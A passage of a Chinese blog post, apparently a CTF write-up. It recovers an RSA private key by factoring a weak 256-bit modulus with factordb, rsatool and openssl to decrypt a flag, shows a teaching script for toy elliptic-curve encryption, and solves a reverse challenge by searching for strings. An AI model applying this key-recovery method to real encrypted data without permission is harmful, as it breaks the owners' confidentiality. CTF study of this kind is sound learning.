</code></pre><p>获得<code>flag</code>。</p><h3 id=normal-rsa>Normal RSA<a hidden class=anchor aria-hidden=true href=#normal-rsa>#</a></h3><blockquote><p>Des：你和小鱼走啊走走啊走，走到下一个题目一看你又一愣，怎么还是一个数学题啊 小鱼又一笑，hhhh数学在密码学里面很重要的！现在知道吃亏了吧！你哼一声不服气，我知道数学很重要了！但是工具也很重要的，你看我拿工具把他解出来！你打开电脑折腾了一会还真的把答案做了出来，小鱼有些吃惊，向你投过来一个赞叹的目光。</p></blockquote><h4 id=方法1>方法1<a hidden class=anchor aria-hidden=true href=#方法1>#</a></h4><p>给了<code>flag.enc</code>和<code>pubkey.pem</code>两个文件，分别是密文和公钥，工具：<a href=https://github.com/3summer/CTF-RSA-tool>3summer/CTF-RSA-tool: a little tool help CTFer solve RSA problem (github.com)</a>。</p><p>命令：</p><pre tabindex=0><code>.\solve.py --verbose -k .\pubkey.pem --decrypt .\flag.enc
</code></pre><p>获得<code>flag</code>。</p><h4 id=方法2>方法2<a hidden class=anchor aria-hidden=true href=#方法2>#</a></h4><p><code>pubkey.pem</code>是<code>openssl</code>的文件类型，传统<code>RSA</code>公钥形式为<code>(e,N)</code>，用<code>openssl</code>解出<code>e</code>和<code>N</code>的值。<code>kali</code>自带<code>openssl</code>，使用命令<code> openssl rsa -pubin -text -modulus -in pubkey.pem</code>对文件进行解析，或者<a href=http://tool.chacuo.net/cryptrsakeyparse>RSA公私钥分解 Exponent、Modulus，Rsa公私钥指数、系数(模数)分解&ndash;查错网 (chacuo.net)</a><a href=http://tool.chacuo.net/cryptrsakeyparse>http://tool.chacuo.net/cryptrsakeyparse</a>)。</p><pre tabindex=0><code>RSA Public-Key: (256 bit)
Modulus:
  00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:
  1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7d:
  be:30:dd
Exponent: 65537 (0x10001)
Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD
</code></pre><p>其中<code>65537</code>为e的值，<code>C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</code>为N的十六进制值，将其转换为十进制，结果为<code>87924348264132406875276140514499937145050893665602592992418171647042491658461</code>。</p><p><a href=http://www.factordb.com/index.php>factordb.com</a>计算p值与q值。</p><p>p=<code>275127860351348928173285174381581152299</code>。</p><p>q=<code>319576316814478949870590164193048041239</code>。</p><p>工具下载:<a href=https://github.com/ius/rsatool>ius/rsatool: rsatool can be used to calculate RSA and RSA-CRT parameters (github.com)</a></p><p><code>python setup.py install</code></p><p><code>python rsatool.py -o private.pem -e 65537 -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239</code>，生成一个private文件。</p><p><code>openssl rsautl -decrypt -in flag.enc -inkey private.pem</code>.</p><p>获得<code>flag</code>。</p><h3 id=easy-ecc>easy ECC<a hidden class=anchor aria-hidden=true href=#easy-ecc>#</a></h3><blockquote><p>Des：转眼两个人又走到了下一个谜题的地方，这又是一种经典的密码学加密方式 而你刚好没有这个的工具，你对小鱼说“小鱼我知道数学真的很重要了，有了工具只是方便我们使用，懂了原理才能做到，小鱼你教我一下这个题怎么做吧！”在小鱼的一步步带领下，你终于明白了ECC 的基本原理，成功的解开了这个题目，两个人相视一笑，快步走向了下一个题目所在的位置。flag格式为cyberpeace{x+y的值}。</p></blockquote><p>参考文章：</p><p><a href=https://www.codeleading.com/article/66452707105/>椭圆曲线加密浅析 - 代码先锋网 (codeleading.com)</a></p><p>上脚本：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    考虑K=kG ，其中K、G为椭圆曲线Ep(a,b)上的点，n为G的阶（nG=O∞ ），k为小于n的整数。
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    则给定k和G，根据加法法则，计算K很容易但反过来，给定K和G，求k就非常困难。
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    因为实际使用中的ECC原则上把p取得相当大，n也相当大，要把n个解点逐一算出来列成上表是不可能的。
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    这就是椭圆曲线加密算法的数学依据
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    点G称为基点（base point）
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    k（k&lt;n）为私有**（privte key）
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    K为公开**（public key)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_inverse</span>(mu, p):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    获取y的负元
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, p):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (i<span style=color:#f92672>*</span>mu)<span style=color:#f92672>%</span>p <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> i
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_gcd</span>(zi, mu):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    获取最大公约数
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> mu:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> get_gcd(mu, zi<span style=color:#f92672>%</span>mu)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> zi
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_np</span>(x1, y1, x2, y2, a, p):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    获取n*p，每次+p，直到求解阶数np=-p
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    flag <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>  <span style=color:#75715e># 定义符号位（+/-）</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#75715e># 如果 p=q  k=(3x2+a)/2y1mod p</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> x1 <span style=color:#f92672>==</span> x2 <span style=color:#f92672>and</span> y1 <span style=color:#f92672>==</span> y2:
</span></span><span style=display:flex><span>        zi <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span> <span style=color:#f92672>*</span> (x1 <span style=color:#f92672>**</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>+</span> a  <span style=color:#75715e># 计算分子      【求导】</span>
</span></span><span style=display:flex><span>        mu <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>*</span> y1    <span style=color:#75715e># 计算分母</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#75715e># 若P≠Q，则k=(y2-y1)/(x2-x1) mod p</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        zi <span style=color:#f92672>=</span> y2 <span style=color:#f92672>-</span> y1
</span></span><span style=display:flex><span>        mu <span style=color:#f92672>=</span> x2 <span style=color:#f92672>-</span> x1
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> zi<span style=color:#f92672>*</span> mu <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>            flag <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>        <span style=color:#75715e># 符号0为-（负数）</span>
</span></span><span style=display:flex><span>            zi <span style=color:#f92672>=</span> abs(zi)
</span></span><span style=display:flex><span>            mu <span style=color:#f92672>=</span> abs(mu)
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#75715e># 将分子和分母化为最简</span>
</span></span><span style=display:flex><span>    gcd_value <span style=color:#f92672>=</span> get_gcd(zi, mu)     <span style=color:#75715e># 最大公約數</span>
</span></span><span style=display:flex><span>    zi <span style=color:#f92672>=</span> zi <span style=color:#f92672>//</span> gcd_value            <span style=color:#75715e># 整除</span>
</span></span><span style=display:flex><span>    mu <span style=color:#f92672>=</span> mu <span style=color:#f92672>//</span> gcd_value
</span></span><span style=display:flex><span>    <span style=color:#75715e># 求分母的逆元  逆元： ∀a ∈G ，ョb∈G 使得 ab = ba = e</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># P(x,y)的负元是 (x,-y mod p)= (x,p-y) ，有P+(-P)= O∞</span>
</span></span><span style=display:flex><span>    inverse_value <span style=color:#f92672>=</span> get_inverse(mu, p)
</span></span><span style=display:flex><span>    k <span style=color:#f92672>=</span> (zi <span style=color:#f92672>*</span> inverse_value)
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> flag <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:                   <span style=color:#75715e># 斜率负数 flag==0</span>
</span></span><span style=display:flex><span>        k <span style=color:#f92672>=</span> <span style=color:#f92672>-</span>k
</span></span><span style=display:flex><span>    k <span style=color:#f92672>=</span> k <span style=color:#f92672>%</span> p
</span></span><span style=display:flex><span>    <span style=color:#75715e># 计算x3,y3 P+Q</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        x3≡k2-x1-x2(mod p)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        y3≡k(x1-x3)-y1(mod p)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    x3 <span style=color:#f92672>=</span> (k <span style=color:#f92672>**</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>-</span> x1 <span style=color:#f92672>-</span> x2) <span style=color:#f92672>%</span> p
</span></span><span style=display:flex><span>    y3 <span style=color:#f92672>=</span> (k <span style=color:#f92672>*</span> (x1 <span style=color:#f92672>-</span> x3) <span style=color:#f92672>-</span> y1) <span style=color:#f92672>%</span> p
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> x3,y3
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_rank</span>(x0, y0, a, b, p):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    获取椭圆曲线的阶
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    x1 <span style=color:#f92672>=</span> x0             <span style=color:#75715e>#-p的x坐标</span>
</span></span><span style=display:flex><span>    y1 <span style=color:#f92672>=</span> (<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>*</span>y0)<span style=color:#f92672>%</span>p      <span style=color:#75715e>#-p的y坐标</span>
</span></span><span style=display:flex><span>    tempX <span style=color:#f92672>=</span> x0
</span></span><span style=display:flex><span>    tempY <span style=color:#f92672>=</span> y0
</span></span><span style=display:flex><span>    n <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>        n <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># 求p+q的和，得到n*p，直到求出阶</span>
</span></span><span style=display:flex><span>        p_x,p_y <span style=color:#f92672>=</span> get_np(tempX, tempY, x0, y0, a, p)
</span></span><span style=display:flex><span>        <span style=color:#75715e># 如果 == -p,那么阶数+1，返回</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> p_x <span style=color:#f92672>==</span> x1 <span style=color:#f92672>and</span> p_y <span style=color:#f92672>==</span> y1:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> n<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        tempX <span style=color:#f92672>=</span> p_x
</span></span><span style=display:flex><span>        tempY <span style=color:#f92672>=</span> p_y
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_param</span>(x0, a, b, p):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    计算p与-p
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    y0 <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(p):
</span></span><span style=display:flex><span>        <span style=color:#75715e># 满足取模约束条件，椭圆曲线Ep(a,b)，p为质数，x,y∈[0,p-1]</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> i<span style=color:#f92672>**</span><span style=color:#ae81ff>2</span><span style=color:#f92672>%</span>p <span style=color:#f92672>==</span> (x0<span style=color:#f92672>**</span><span style=color:#ae81ff>3</span> <span style=color:#f92672>+</span> a<span style=color:#f92672>*</span>x0 <span style=color:#f92672>+</span> b)<span style=color:#f92672>%</span>p:
</span></span><span style=display:flex><span>            y0 <span style=color:#f92672>=</span> i
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#75715e># 如果y0没有，返回false</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> y0 <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#75715e># 计算-y（负数取模）</span>
</span></span><span style=display:flex><span>    x1 <span style=color:#f92672>=</span> x0
</span></span><span style=display:flex><span>    y1 <span style=color:#f92672>=</span> (<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>*</span>y0) <span style=color:#f92672>%</span> p
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> x0,y0,x1,y1
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_graph</span>(a, b, p):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    输出椭圆曲线散点图
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    x_y <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#75715e># 初始化二维数组</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(p):
</span></span><span style=display:flex><span>        x_y<span style=color:#f92672>.</span>append([<span style=color:#e6db74>&#39;-&#39;</span> <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(p)])
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(p):
</span></span><span style=display:flex><span>        val <span style=color:#f92672>=</span>get_param(i, a, b, p)  <span style=color:#75715e># 椭圆曲线上的点</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(val <span style=color:#f92672>!=</span> <span style=color:#66d9ef>False</span>):
</span></span><span style=display:flex><span>            x0,y0,x1,y1 <span style=color:#f92672>=</span> val
</span></span><span style=display:flex><span>            x_y[x0][y0] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>            x_y[x1][y1] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;椭圆曲线的散列图为：&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(p):              <span style=color:#75715e># i= 0-&gt; p-1</span>
</span></span><span style=display:flex><span>        temp <span style=color:#f92672>=</span> p<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>-</span>i        <span style=color:#75715e># 倒序</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>        <span style=color:#75715e># 格式化输出1/2位数，y坐标轴</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> temp <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>10</span>:
</span></span><span style=display:flex><span>            print(temp, end<span style=color:#f92672>=</span><span style=color:#e6db74>&#34; &#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            print(temp, end<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;  &#34;</span>)
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>        <span style=color:#75715e># 输出具体坐标的值，一行</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> range(p):
</span></span><span style=display:flex><span>            print(x_y[j][temp], end<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;  &#34;</span>)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;&#34;</span>)   <span style=color:#75715e>#换行</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#75715e># 输出 x 坐标轴</span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;  &#34;</span>, end<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(p):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> i <span style=color:#f92672>&gt;=</span><span style=color:#ae81ff>10</span>:
</span></span><span style=display:flex><span>            print(i, end<span style=color:#f92672>=</span><span style=color:#e6db74>&#34; &#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            print(i, end<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;  &#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_ng</span>(G_x, G_y, key, a, p):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    计算nG
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    temp_x <span style=color:#f92672>=</span> G_x
</span></span><span style=display:flex><span>    temp_y <span style=color:#f92672>=</span> G_y
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> key <span style=color:#f92672>!=</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>        temp_x,temp_y <span style=color:#f92672>=</span> get_np(temp_x,temp_y, G_x, G_y, a, p)
</span></span><span style=display:flex><span>        key <span style=color:#f92672>-=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> temp_x,temp_y
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>ecc_main</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>        a <span style=color:#f92672>=</span> int(input(<span style=color:#e6db74>&#34;请输入椭圆曲线参数a(a&gt;0)的值：&#34;</span>))
</span></span><span style=display:flex><span>        b <span style=color:#f92672>=</span> int(input(<span style=color:#e6db74>&#34;请输入椭圆曲线参数b(b&gt;0)的值：&#34;</span>))
</span></span><span style=display:flex><span>        p <span style=color:#f92672>=</span> int(input(<span style=color:#e6db74>&#34;请输入椭圆曲线参数p(p为素数)的值：&#34;</span>))   <span style=color:#75715e>#用作模运算</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>        <span style=color:#75715e># 条件满足判断</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#ae81ff>4</span><span style=color:#f92672>*</span>(a<span style=color:#f92672>**</span><span style=color:#ae81ff>3</span>)<span style=color:#f92672>+</span><span style=color:#ae81ff>27</span><span style=color:#f92672>*</span>(b<span style=color:#f92672>**</span><span style=color:#ae81ff>2</span>))<span style=color:#f92672>%</span>p <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#34;您输入的参数有误，请重新输入！！！</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#75715e># 输出椭圆曲线散点图</span>
</span></span><span style=display:flex><span>    get_graph(a, b, p)
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#75715e># 选点作为G点</span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;user1：在如上坐标系中选一个值为G的坐标&#34;</span>)
</span></span><span style=display:flex><span>    G_x <span style=color:#f92672>=</span> int(input(<span style=color:#e6db74>&#34;user1：请输入选取的x坐标值：&#34;</span>))
</span></span><span style=display:flex><span>    G_y <span style=color:#f92672>=</span> int(input(<span style=color:#e6db74>&#34;user1：请输入选取的y坐标值：&#34;</span>))
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#75715e># 获取椭圆曲线的阶</span>
</span></span><span style=display:flex><span>    n <span style=color:#f92672>=</span> get_rank(G_x, G_y, a, b, p)
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#75715e># user1生成私钥，小key</span>
</span></span><span style=display:flex><span>    key <span style=color:#f92672>=</span> int(input(<span style=color:#e6db74>&#34;user1：请输入私钥小key（&lt;</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>）：&#34;</span><span style=color:#f92672>.</span>format(n)))
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#75715e># user1生成公钥，大KEY</span>
</span></span><span style=display:flex><span>    KEY_x,kEY_y <span style=color:#f92672>=</span> get_ng(G_x, G_y, key, a, p)
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#75715e># user2阶段</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># user2拿到user1的公钥KEY，Ep(a,b)阶n，加密需要加密的明文数据</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 加密准备</span>
</span></span><span style=display:flex><span>    k <span style=color:#f92672>=</span> int(input(<span style=color:#e6db74>&#34;user2：请输入一个整数k（&lt;</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>）用于求kG和kQ：&#34;</span><span style=color:#f92672>.</span>format(n)))
</span></span><span style=display:flex><span>    k_G_x,k_G_y <span style=color:#f92672>=</span> get_ng(G_x, G_y, k, a, p)                         <span style=color:#75715e># kG</span>
</span></span><span style=display:flex><span>    k_Q_x,k_Q_y <span style=color:#f92672>=</span> get_ng(KEY_x, kEY_y, k, a, p)                     <span style=color:#75715e># kQ</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#75715e># 加密</span>
</span></span><span style=display:flex><span>    plain_text <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;user2：请输入需要加密的字符串:&#34;</span>)
</span></span><span style=display:flex><span>    plain_text <span style=color:#f92672>=</span> plain_text<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>    <span style=color:#75715e>#plain_text = int(input(&#34;user1：请输入需要加密的密文：&#34;))</span>
</span></span><span style=display:flex><span>    c <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;密文为：&#34;</span>,end<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> char <span style=color:#f92672>in</span> plain_text:
</span></span><span style=display:flex><span>        intchar <span style=color:#f92672>=</span> ord(char)
</span></span><span style=display:flex><span>        cipher_text <span style=color:#f92672>=</span> intchar<span style=color:#f92672>*</span>k_Q_x
</span></span><span style=display:flex><span>        c<span style=color:#f92672>.</span>append([k_G_x, k_G_y, cipher_text])
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;(</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>,</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>),</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(k_G_x, k_G_y, cipher_text),end<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;-&#34;</span>)
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    <span style=color:#75715e># user1阶段</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 拿到user2加密的数据进行解密</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 知道 k_G_x,k_G_y，key情况下，求解k_Q_x,k_Q_y是容易的，然后plain_text = cipher_text/k_Q_x</span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>user1解密得到明文：&#34;</span>,end<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> charArr <span style=color:#f92672>in</span> c:
</span></span><span style=display:flex><span>        decrypto_text_x,decrypto_text_y <span style=color:#f92672>=</span> get_ng(charArr[<span style=color:#ae81ff>0</span>], charArr[<span style=color:#ae81ff>1</span>], key, a, p)
</span></span><span style=display:flex><span>        print(chr(charArr[<span style=color:#ae81ff>2</span>]<span style=color:#f92672>//</span>decrypto_text_x),end<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>        <span style=color:#75715e>#inverse_value = get_inverse(decrypto_text_x, p)</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#text = charArr[2]*inverse_value%p</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>#print(text,end=&#34; &#34;)</span>
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;*************ECC椭圆曲线加密*************&#34;</span>)
</span></span><span style=display:flex><span>    ecc_main()
</span></span></code></pre></div><p>获得<code>flag</code>。</p><h2 id=mobile>Mobile<a hidden class=anchor aria-hidden=true href=#mobile>#</a></h2><h3 id=easy-so>easy-so<a hidden class=anchor aria-hidden=true href=#easy-so>#</a></h3><blockquote><p>Des：N/A。</p></blockquote><h2 id=reverse>Reverse<a hidden class=anchor aria-hidden=true href=#reverse>#</a></h2><h3 id=insanity>insanity<a hidden class=anchor aria-hidden=true href=#insanity>#</a></h3><blockquote><p>Des：菜鸡觉得前面的题目太难了，来个简单的缓一下。</p></blockquote><h4 id=做法1>做法1<a hidden class=anchor aria-hidden=true href=#做法1>#</a></h4><p>用<code>IDA</code>打开文件，<code>Shift+F12</code>。</p><h4 id=做法2>做法2<a hidden class=anchor aria-hidden=true href=#做法2>#</a></h4><p>用记事本打开文件，搜索<code>flag</code>。</p><p>获得<code>flag</code>。</p><blockquote><p>文章许可：本文采用<a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh>CC BY-NC-SA 4.0</a>许可协议，转载请注明出处。</p></blockquote></div><footer class=post-footer><ul class=post-tags><li><a href=https://oopsdc.com/tags/ctf/>CTF</a></li></ul><nav class=paginav><a class=prev href=https://oopsdc.com/post/bugku/><span class=title>« Prev</span><br><span>Bugku</span></a>
<a class=next href=https://oopsdc.com/post/apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/><span class=title>Next »</span><br><span>Apache漏洞复现</span></a></nav></footer><div><div class=pagination__title><span class=pagination__title-h style=font-size:20px>Comments</span><hr></div><div id=tcomment></div><script src=https://cdn.staticfile.org/twikoo/1.6.6/twikoo.all.min.js></script>
